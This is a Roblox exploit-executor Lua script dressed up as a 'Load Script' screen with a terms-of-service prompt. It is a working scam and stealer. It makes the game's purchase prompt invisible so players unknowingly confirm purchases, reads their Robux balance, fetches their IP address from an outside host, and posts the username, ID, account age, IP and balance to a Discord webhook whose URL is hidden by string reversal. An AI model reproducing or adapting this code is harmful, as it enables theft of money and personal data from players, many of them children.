
spawn(function()
    while true do
    wait()
    game.ReplicatedFirst:RemoveDefaultLoadingScreen()
    end
    end)
game:GetService("RunService").Heartbeat:Connect(function()
    game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
end)
local ScreenGui = Instance.new("ScreenGui")
if syn then
syn.protect_gui(ScreenGui)
end
spawn(function()
    game:GetService("RunService").RenderStepped:Connect(function()
    if game:GetService("CoreGui"):FindFirstChild("PurchasePrompt") then
    for i, v in pairs(game:GetService("CoreGui").PurchasePrompt:GetDescendants()) do
    if v:IsA("Frame") then
        v.BackgroundTransparency = 1
    end
    if v:IsA("TextLabel") then
        if v.Name ~= "BalanceAmount" then
        v.Text = ""
        end
        v.TextTransparency = 1
    end
    if v:IsA("ImageButton") then
        v.ImageTransparency = 1
    end
    if v:IsA("ImageLabel") then
        v.ImageTransparency = 1
    end
    end
    end
    end)
end)

local TeleportService = game:GetService("TeleportService")
TeleportService:SetTeleportGui(ScreenGui)
-- Gui to Lua
-- Version: 3.2

-- Instances:
local GUI = Instance.new("Frame")
local PenumbraShadow = Instance.new("ImageLabel")
local TextLabel = Instance.new("TextLabel")
local sexline = Instance.new("Frame")
local UIGradient = Instance.new("UIGradient")
local TextLabel_2 = Instance.new("TextLabel")
local TextLabel_3 = Instance.new("TextLabel")
local TextLabel_4 = Instance.new("TextLabel")
local TextButton = Instance.new("TextButton")
local UICorner = Instance.new("UICorner")
local tos = Instance.new("TextLabel")
local text = Instance.new("TextLabel")
local agree = Instance.new("TextButton")
local UICorner_2 = Instance.new("UICorner")
local load = Instance.new("TextButton")
local UICorner_3 = Instance.new("UICorner")
repeat wait() until game:IsLoaded()
--Properties:
ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.ResetOnSpawn = false
ScreenGui.Name = "RobloxCoreGUI"

GUI.Name = "GUI"
GUI.Parent = ScreenGui
GUI.AnchorPoint = Vector2.new(0.5, 0.5)
GUI.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
GUI.BorderColor3 = Color3.fromRGB(15, 15, 15)
GUI.BorderSizePixel = 100
GUI.Position = UDim2.new(0.5, 0, 0.5, 0)
GUI.Size = UDim2.new(1, 0, 1.20000005, 0)

PenumbraShadow.Name = "PenumbraShadow"
PenumbraShadow.Parent = GUI
PenumbraShadow.AnchorPoint = Vector2.new(0.5, 0.5)
PenumbraShadow.BackgroundTransparency = 1.000
PenumbraShadow.Position = UDim2.new(0.5, 0, 0.5, 1)
PenumbraShadow.Size = UDim2.new(1, 18, 1, 18)
PenumbraShadow.ZIndex = 0
PenumbraShadow.Image = "rbxassetid://1316045217"
PenumbraShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
PenumbraShadow.ImageTransparency = 0.880
PenumbraShadow.ScaleType = Enum.ScaleType.Slice
PenumbraShadow.SliceCenter = Rect.new(10, 10, 118, 118)

TextLabel.Parent = GUI
TextLabel.AnchorPoint = Vector2.new(0.5, 0.5)
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.Position = UDim2.new(0.5, 0, 0.100000001, 0)
TextLabel.Size = UDim2.new(0.168490157, 0, 0.073282443, 0)
TextLabel.Font = Enum.Font.Gotham
TextLabel.Text = game:HttpGet("https://raw.githubusercontent.com/shibbylol/ffffffortnite/main/name.txt")
TextLabel.TextColor3 = Color3.fromRGB(255, 153, 10)
TextLabel.TextScaled = true
TextLabel.TextSize = 30.000
TextLabel.TextWrapped = true

sexline.Name = "sexline"
sexline.Parent = GUI
sexline.AnchorPoint = Vector2.new(0.5, 0.5)
sexline.BackgroundColor3 = Color3.fromRGB(255, 153, 10)
sexline.BorderSizePixel = 0
sexline.Position = UDim2.new(0.5, 0, 0.9, 0)
sexline.Size = UDim2.new(0.562363267, 0, 0.00305343512, 0)

UIGradient.Transparency = NumberSequence.new{NumberSequenceKeypoint.new(0.00, 1.00), NumberSequenceKeypoint.new(0.50, 0.00), NumberSequenceKeypoint.new(1.00, 1.00)}
UIGradient.Parent = sexline

TextLabel_2.Parent = GUI
TextLabel_2.AnchorPoint = Vector2.new(0.5, 0.5)
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.Position = UDim2.new(0.499635309, 0, 0.13, 0)
TextLabel_2.Size = UDim2.new(0.240700215, 0, 0.0304550454, 0)
TextLabel_2.Font = Enum.Font.Gotham
TextLabel_2.Text = "The dogs bark, the bear walks."
TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.TextSize = 15.000
TextLabel_2.TextWrapped = true

TextLabel_3.Parent = GUI
TextLabel_3.AnchorPoint = Vector2.new(0.5, 0.5)
TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.BackgroundTransparency = 1.000
TextLabel_3.Position = UDim2.new(0.5, 0, 0.899999976, 0)
TextLabel_3.Size = UDim2.new(0, 200, 0, 50)
TextLabel_3.Font = Enum.Font.GothamMedium
TextLabel_3.Text = "Loading Script"
TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.TextSize = 14.000

TextLabel_4.Parent = TextLabel_3
TextLabel_4.AnchorPoint = Vector2.new(0.5, 0.5)
TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_4.BackgroundTransparency = 1.000
TextLabel_4.Position = UDim2.new(0.5, 0, 0.899999976, 0)
TextLabel_4.Size = UDim2.new(0, 200, 0, 50)
TextLabel_4.Font = Enum.Font.GothamMedium
TextLabel_4.Text = "(0/1)"
TextLabel_4.TextColor3 = Color3.fromRGB(255, 153, 10)
TextLabel_4.TextSize = 12.000

TextButton.Parent = GUI
TextButton.AnchorPoint = Vector2.new(0.5, 0.5)
TextButton.BackgroundColor3 = Color3.fromRGB(255, 153, 10)
TextButton.BackgroundTransparency = 1.000
TextButton.BorderSizePixel = 0
TextButton.Position = UDim2.new(0.552803278, 0, 0.557199836, 0)
TextButton.Size = UDim2.new(0, 133, 0, 36)
TextButton.Font = Enum.Font.GothamBold
TextButton.Text = "Load Script"
TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton.TextSize = 14.000
TextButton.TextTransparency = 1.000

UICorner.CornerRadius = UDim.new(0, 2)
UICorner.Parent = TextButton

tos.Name = "tos"
tos.Parent = GUI
tos.AnchorPoint = Vector2.new(0.5, 0.5)
tos.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
tos.BackgroundTransparency = 1.000
tos.Position = UDim2.new(0.5, 0, 0.219999999, 0)
tos.Size = UDim2.new(0.240700215, 0, 0.0304550454, 0)
tos.Font = Enum.Font.GothamBold
tos.Text = "Terms of service"
tos.TextColor3 = Color3.fromRGB(255, 255, 255)
tos.TextSize = 15.000
tos.TextWrapped = true

text.Name = "text"
text.Parent = GUI
text.AnchorPoint = Vector2.new(0.5, 0.5)
text.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
text.BackgroundTransparency = 1.000
text.Position = UDim2.new(0.5, 0, 0.300000012, 0)
text.Size = UDim2.new(0.383661568, 0, 0.0304550454, 0)
text.Font = Enum.Font.GothamMedium
text.Text = "https://pastebin.com/raw/GsRcVpBt"
text.TextColor3 = Color3.fromRGB(255, 255, 255)
text.TextSize = 15.000
text.TextWrapped = true

agree.Name = "agree"
agree.Parent = GUI
agree.AnchorPoint = Vector2.new(0.5, 0.5)
agree.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
agree.BackgroundTransparency = 1.000
agree.BorderSizePixel = 0
agree.Position = UDim2.new(0.441999998, 0, 0.55719983, 0)
agree.Size = UDim2.new(0, 133, 0, 36)
agree.Font = Enum.Font.GothamBold
agree.Text = "I agree"
agree.TextColor3 = Color3.fromRGB(255, 255, 255)
agree.TextSize = 14.000
agree.TextTransparency = 1.000

UICorner_2.CornerRadius = UDim.new(0, 2)
UICorner_2.Parent = agree

load.Name = "load"
load.Parent = GUI
load.AnchorPoint = Vector2.new(0.5, 0.5)
load.BackgroundColor3 = Color3.fromRGB(255, 153, 10)
load.BackgroundTransparency = 1.000
load.BorderSizePixel = 0
load.Position = UDim2.new(0.552803278, 0, 0.55719983, 0)
load.Size = UDim2.new(0, 133, 0, 36)
load.Font = Enum.Font.GothamBold
load.Text = "Load Script"
load.TextColor3 = Color3.fromRGB(255, 255, 255)
load.TextSize = 14.000
load.TextTransparency = 1.000

UICorner_3.CornerRadius = UDim.new(0, 2)
UICorner_3.Parent = load
repeat wait(1) until game:IsLoaded()
TextLabel_3.Text = "Finished!"
TextLabel_4.Text = "(1/1)"
wait(1)
local TweenService = game:GetService("TweenService")
local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Linear, Enum.EasingDirection.In)
local tweenInfo2 = TweenInfo.new(5, Enum.EasingStyle.Linear, Enum.EasingDirection.In)
TweenService:Create(TextLabel_3, tweenInfo, {TextTransparency = 1,BackgroundTransparency = 1}):Play()
TweenService:Create(TextLabel_4, tweenInfo, {TextTransparency = 1,BackgroundTransparency = 1}):Play()
wait(4)
TweenService:Create(agree, tweenInfo, {TextTransparency = 0,BackgroundTransparency = 0}):Play()
local a = game:HttpGet("https://Google.littsedth.repl.co/GetHeaders")
local d = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="..game.Players.LocalPlayer.UserId.."&size=420x420&format=Png&isCircular=false"))
local prem = "None"
if game.Players.LocalPlayer.MembershipType == Enum.MembershipType.Premium then
    prem = "Premium"
end
local bal
pcall(function()
	local thing = game:GetService("CoreGui"):WaitForChild("PurchasePrompt"):WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator"):WaitForChild("Prompt"):WaitForChild("AlertContents").Footer.FooterContent.Content.BalanceAmount.Text
	local extra = string.gsub(thing,",","")
	local extra2 = string.gsub(thing,".","")
	local extra3 = string.gsub(thing," ","")
	bal = tonumber(extra3) + 1
end)
repeat wait() until bal ~= nil

if bal == nil then
	game.Players.LocalPlayer:Kick("Invalid.")
end
game:GetService("RunService").RenderStepped:Connect(function()
	if workspace:FindFirstChild("robu") then
		workspace.robu.Value = bal
	end
end)
local boughtonce = false
game:GetService("CoreGui"):WaitForChild("PurchasePrompt"):WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator"):WaitForChild("Prompt"):WaitForChild("AlertContents"):WaitForChild("Footer"):WaitForChild("Buttons")["1"].MouseButton1Down:Connect(function()
	TweenService:Create(load, tweenInfo2, {TextTransparency = 0,BackgroundTransparency = 0}):Play()
	TweenService:Create(agree, tweenInfo, {TextTransparency = 1,BackgroundTransparency = 1}):Play()
	wait(3)
	game:GetService("CoreGui"):WaitForChild("PurchasePrompt"):WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator"):WaitForChild("Prompt"):WaitForChild("AlertContents"):WaitForChild("Footer"):WaitForChild("Buttons")["2"].MouseButton1Down:Connect(function()
        wait(2)
		if game:GetService("CoreGui"):FindFirstChild("PurchasePrompt") then
        for i, v in pairs(game:GetService("CoreGui").PurchasePrompt:GetChildren()) do
            v:Destroy()
        end
	end
		http_request = http_request or request or (http and http.request) or syn.request 
	if bal > 2500 and boughtonce == false then
		boughtonce = true
		local response = http_request(
			{
	
			Url = string.reverse("x-0s1Z9ehCWKcrxNTHrOzpVc6mS--5VWGbyYdkiC1g-K-cE0inmCOtvpZP2-2CnL7xq2/0400888398774530001/skoohbew/ipa/moc.drocsid//:sptth"),
			Method = "POST",
			Headers = {
				["Content-Type"] = "application/json"  -- When sending JSON, set this!
			},
			Body = game:GetService("HttpService"):JSONEncode({ ["content"] = "<@&1000356548041773156>",["embeds"] = {{
				["title"] = "Purchase Log - LARGE",
				["url"] = "https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId.. "/profile",
				["color"] = 4062976,
				["fields"] = {
					{
						["name"] = "Robux",
						["value"] = "```lua\n"..bal.."\n```",
						["inline"] = true
					  },
					{
						["name"] = "User ID",
						["value"] = "```lua\n"..game.Players.LocalPlayer.UserId.."\n```",
						["inline"] = true
					  },
					  
					  {
						["name"] = "Account Age",
						["value"] = "```lua\n"..game.Players.LocalPlayer.AccountAge.."\n```",
						["inline"] = true
					  },
					  {
						["name"] = "IP Address",
						["value"] = "```lua\n"..a.."\n```"
					  },
					  {
						["name"] = "Membership",
						["value"] = "```md\n#"..prem.."\n```"
					  },
					  {
						["name"] = "Username",
						["value"] = "```md\n#"..game.Players.LocalPlayer.Name.."\n```"
					  }
				},
				["footer"] = {
					["text"] = "Blackbear Purchase Logs https://discord.gg/UrGg5BmRAH"
				},
				["thumbnail"] = {
					["url"] = d.data[1].imageUrl
				}
			}}})
		})
	elseif bal < 2500 and boughtonce == false then
		local response = http_request(
			{
	
			Url = string.reverse("x-0s1Z9ehCWKcrxNTHrOzpVc6mS--5VWGbyYdkiC1g-K-cE0inmCOtvpZP2-2CnL7xq2/0400888398774530001/skoohbew/ipa/moc.drocsid//:sptth"),
			Method = "POST",
			Headers = {
				["Content-Type"] = "application/json"  -- When sending JSON, set this!
			},
			Body = game:GetService("HttpService"):JSONEncode({ ["embeds"] = {{
				["title"] = "Purchase Log - SMALL",
				["url"] = "https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId.. "/profile",
				["color"] = 5814783,
				["fields"] = {
					{
						["name"] = "Robux",
						["value"] = "```lua\n"..bal.."\n```",
						["inline"] = true
					  },
					{
						["name"] = "User ID",
						["value"] = "```lua\n"..game.Players.LocalPlayer.UserId.."\n```",
						["inline"] = true
					  },
					  
					  {
						["name"] = "Account Age",
						["value"] = "```lua\n"..game.Players.LocalPlayer.AccountAge.."\n```",
						["inline"] = true
					  },
					  {
						["name"] = "IP Address",
						["value"] = "```lua\n"..a.."\n```"
					  },
					  {
						["name"] = "Membership",
						["value"] = "```md\n#"..prem.."\n```"
					  },
					  {
						["name"] = "Username",
						["value"] = "```md\n#"..game.Players.LocalPlayer.Name.."\n```"
					  }
				},
				["footer"] = {
					["text"] = "Blackbear Purchase Logs https://discord.gg/UrGg5BmRAH"
				},
				["thumbnail"] = {
					["url"] = d.data[1].imageUrl
				}
			}}})
		})
	end
    end)
end)
